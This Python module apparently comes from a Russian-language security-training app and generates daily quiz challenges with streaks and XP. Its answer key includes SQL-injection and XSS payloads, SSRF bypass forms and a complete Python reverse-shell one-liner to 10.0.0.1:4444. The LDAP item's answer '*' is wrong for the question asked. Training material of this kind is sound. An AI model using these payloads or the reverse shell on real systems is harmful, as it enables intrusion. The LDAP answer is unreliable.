"""Ежедневные челленджи с системой стриков."""

import json
import os
import random
from datetime import UTC, date, datetime, timedelta
from typing import Any

from rich.panel import Panel

from ui import console

CHALLENGE_FILE = "./memory/daily_challenges.json"

DIFFICULTIES = ["easy", "medium", "hard"]

CHALLENGE_TEMPLATES = {
    "easy": [
        {
            "title": "Base64 детектив",
            "desc": "Раскодируй: {payload}. Что скрывает строка?",
            "payload_gen": lambda: "Q3liZXJUZWljaGVyIGlzIGF3ZXNvbWUh",
            "answer": "CyberTeacher is awesome!",
            "hint": "Используй base64 декодер",
        },
        {
            "title": "Порт-сканер",
            "desc": "Какой порт использует HTTPS по умолчанию? Назови номер.",
            "payload_gen": lambda: "",
            "answer": "443",
            "hint": "Стандартный порт для TLS/SSL",
        },
        {
            "title": "HTTP статус",
            "desc": "Какой код ответа означает 'Forbidden'?",
            "payload_gen": lambda: "",
            "answer": "403",
            "hint": "4xx — клиентская ошибка",
        },
        {
            "title": "Хеш-идентификация",
            "desc": "Определи тип хеша: 5f4dcc3b5aa765d61d8327deb882cf99",
            "payload_gen": lambda: "",
            "answer": "MD5",
            "hint": "32 hex символа, без соли",
        },
        {
            "title": "SQL-инъекция база",
            "desc": "Напиши payload для обхода аутентификации через SQL-инъекцию в поле логина.",
            "payload_gen": lambda: "",
            "answer": "admin' OR '1'='1",
            "hint": "Классический тавтология",
        },
        {
            "title": "XSS payload",
            "desc": "Напиши минимальный XSS payload для вызова alert(1).",
            "payload_gen": lambda: "",
            "answer": "<script>alert(1)</script>",
            "hint": "HTML тег + JavaScript",
        },
    ],
    "medium": [
        {
            "title": "JWT декодирование",
            "desc": "Раскодируй JWT header: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9. Какой алгоритм используется?",
            "payload_gen": lambda: "",
            "answer": "HS256",
            "hint": "Первая часть JWT — это base64(header)",
        },
        {
            "title": "Nmap сканирование",
            "desc": "Какой флаг Nmap определяет версии сервисов?",
            "payload_gen": lambda: "",
            "answer": "-sV",
            "hint": "Service Version",
        },
        {
            "title": "Linux PrivEsc",
            "desc": "Какая команда показывает, что может запускать текущий пользователь через sudo?",
            "payload_gen": lambda: "",
            "answer": "sudo -l",
            "hint": "List sudo privileges",
        },
        {
            "title": "Burp Suite",
            "desc": "Какой модуль Burp Suite позволяет повторно отправлять и модифицировать запросы?",
            "payload_gen": lambda: "",
            "answer": "Repeater",
            "hint": "Не Proxy, не Intruder",
        },
        {
            "title": "Цепочка XSS",
            "desc": "Напиши XSS payload без использования тегов script (для фильтрованного ввода).",
            "payload_gen": lambda: "",
            "answer": "<img src=x onerror=alert(1)>",
            "hint": "Используй event handler",
        },
    ],
    "hard": [
        {
            "title": "Reverse Shell",
            "desc": "Напиши Python one-liner для обратного shell на 10.0.0.1:4444.",
            "payload_gen": lambda: "",
            "answer": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "hint": "socket + os.dup2 + subprocess",
        },
        {
            "title": "LDAP инъекция",
            "desc": "Какой символ используется для комментария в LDAP фильтрах?",
            "payload_gen": lambda: "",
            "answer": "*",
            "hint": "Wildcard character",
        },
        {
            "title": "SSRF bypass",
            "desc": "Назови 2 способа обойти SSRF-фильтр для доступа к localhost.",
            "payload_gen": lambda: "",
            "answer": "127.0.0.1, 0.0.0.0, [::1], localhost, 0177.0.0.1",
            "hint": "Альтернативные представления IP",
        },
    ],
}


def _load_challenges() -> dict:
    """Загрузить историю челленджей."""
    if os.path.exists(CHALLENGE_FILE):
        try:
            with open(CHALLENGE_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"history": {}, "streak": 0, "last_date": None, "best_streak": 0}


def _save_challenges(data: dict):
    """Сохранить историю челленджей."""
    os.makedirs(os.path.dirname(CHALLENGE_FILE), exist_ok=True)
    with open(CHALLENGE_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


def _get_today_str() -> str:
    return date.today().isoformat()


def generate_daily_challenge(difficulty: str | None = None) -> dict[str, Any]:
    """Сгенерировать ежедневный челлендж.

    Если челлендж на сегодня уже есть — возвращает его.
    Иначе генерирует новый и сохраняет.
    """
    data = _load_challenges()
    today = _get_today_str()

    if today in data.get("history", {}):
        return data["history"][today]

    if difficulty is None:
        difficulty = random.choice(DIFFICULTIES)

    templates = CHALLENGE_TEMPLATES.get(difficulty, CHALLENGE_TEMPLATES["easy"])
    template = random.choice(templates)

    challenge = {
        "title": template["title"],
        "desc": template["desc"].format(payload=template["payload_gen"]()),
        "difficulty": difficulty,
        "answer": template["answer"],
        "hint": template["hint"],
        "date": today,
    }

    data.setdefault("history", {})[today] = challenge
    _save_challenges(data)
    return challenge


def submit_daily_answer(user_answer: str) -> dict[str, Any]:
    """Проверить ответ на ежедневный челлендж.

    Returns:
        dict с полями: correct, score, feedback, streak, xp_reward
    """
    data = _load_challenges()
    today = _get_today_str()
    challenge = data.get("history", {}).get(today)

    if not challenge:
        return {"correct": False, "feedback": "Челлендж ещё не сгенерирован. Используй /daily", "xp_reward": 0}

    user_lower = user_answer.strip().lower()
    answer_lower = challenge["answer"].lower()

    # Точное совпадение
    if user_lower == answer_lower:
        return _handle_correct(data, challenge)

    # Частичное совпадение (ключевые слова)
    keywords = _extract_keywords(answer_lower)
    matched = sum(1 for kw in keywords if kw in user_lower)
    if keywords and matched >= max(1, len(keywords) // 2):
        return _handle_partial(data, challenge, matched, len(keywords))

    return {
        "correct": False,
        "feedback": "Не совсем. Попробуй ещё раз или используй /daily hint",
        "xp_reward": 0,
        "streak": data.get("streak", 0),
    }


def _extract_keywords(answer: str) -> list[str]:
    """Извлечь ключевые слова из ответа для частичной проверки."""
    # Убираем короткие слова и спецсимволы
    words = answer.replace("'", "").replace('"', "").replace("(", "").replace(")", "").split()
    return [w for w in words if len(w) > 2]


def _handle_correct(data: dict, challenge: dict) -> dict[str, Any]:
    """Обработка правильного ответа."""
    today = _get_today_str()
    last_date = data.get("last_date")

    # Проверяем стрик
    if last_date:
        last = date.fromisoformat(last_date)
        today_d = date.today()
        if (today_d - last).days == 1:
            data["streak"] = data.get("streak", 0) + 1
        elif (today_d - last).days > 1:
            data["streak"] = 1
    else:
        data["streak"] = 1

    data["last_date"] = today

    # Обновляем лучший стрик
    if data["streak"] > data.get("best_streak", 0):
        data["best_streak"] = data["streak"]

    # XP reward: база + бонус за стрик
    diff_xp = {"easy": 20, "medium": 40, "hard": 70}
    base_xp = diff_xp.get(challenge["difficulty"], 20)
    streak_bonus = min(data["streak"] * 5, 50)  # макс +50 за стрик
    total_xp = base_xp + streak_bonus

    data["history"][today]["completed"] = True
    data["history"][today]["xp_earned"] = total_xp
    _save_challenges(data)

    feedback = "🎯 Верно!"
    if data["streak"] >= 7:
        feedback += f" 🔥 {data['streak']} дней подряд!"
    elif data["streak"] >= 3:
        feedback += f" ⚡ {data['streak']} дня подряд!"

    return {
        "correct": True,
        "feedback": feedback,
        "xp_reward": total_xp,
        "streak": data["streak"],
        "streak_bonus": streak_bonus,
    }


def _handle_partial(data: dict, challenge: dict, matched: int, total: int) -> dict[str, Any]:
    """Обработка частичного ответа."""
    return {
        "correct": False,
        "feedback": f"Частично верно ({matched}/{total} ключевых слов). Попробуй уточнить!",
        "xp_reward": 5,
        "streak": data.get("streak", 0),
    }


def get_daily_status() -> Panel:
    """Показать статус ежедневных челленджей."""
    data = _load_challenges()
    today = _get_today_str()
    challenge = data.get("history", {}).get(today)
    streak = data.get("streak", 0)
    best = data.get("best_streak", 0)

    lines = []
    if challenge:
        completed = challenge.get("completed", False)
        status = "✅ Выполнен" if completed else "⏳ Ожидает ответа"
        lines.append(f"[bold]{challenge['title']}[/bold] [{challenge['difficulty']}]")
        lines.append(f"Статус: {status}")
        if completed:
            lines.append(f"XP получено: {challenge.get('xp_earned', 0)}")
    else:
        lines.append("Челлендж ещё не сгенерирован.")

    lines.append("")
    lines.append(f"🔥 Стрик: {streak} дней")
    lines.append(f"🏆 Лучший стрик: {best} дней")

    return Panel("\n".join(lines), title="ЕЖЕДНЕВНЫЙ ЧЕЛЛЕНДЖ", border_style="yellow")


def get_hint() -> str:
    """Получить подсказку для текущего челленджа."""
    data = _load_challenges()
    today = _get_today_str()
    challenge = data.get("history", {}).get(today)
    if challenge:
        return challenge.get("hint", "Подсказка недоступна")
    return "Челлендж ещё не сгенерирован"
